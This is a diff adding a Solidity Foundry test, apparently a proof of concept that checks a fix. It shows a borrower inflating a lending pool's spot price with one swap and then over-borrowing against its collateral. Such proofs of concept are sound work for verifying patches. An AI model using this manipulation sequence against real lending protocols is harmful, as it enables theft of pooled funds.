@@ -1,0 +1,32 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {Czz} from "../src/Czz.sol";
+
+/// @notice PoC: passes on the ORIGINAL (spot-priced) pool, fails on the PATCHED one.
+///         The borrower inflates the spot price with a single swap, then borrows far
+///         beyond what its collateral is worth at the reference price.
+contract PocTest is Test {
+    Czz internal pool;
+
+    function setUp() public {
+        pool = new Czz(1000, 1000, 1e18); // spot == reference at start
+    }
+
+    function test_spotManipulationOverBorrows() public {
+        pool.fzzDeposit(100);
+        uint256 honestMax = 100 * pool.fzzSafe() / 1e18; // 100 at the reference price
+
+        // Move the market: drop base reserve so spot = quote/base jumps ~5x.
+        pool.fzzSwap(0, 800);
+
+        // Vulnerable pool values collateral at the inflated spot and allows this.
+        pool.fzzBorrow(500);
+
+        assertGt(
+            pool.vzzDebt(address(this)), honestMax,
+            "borrowed beyond the honest (reference-price) limit via spot manipulation"
+        );
+    }
+}
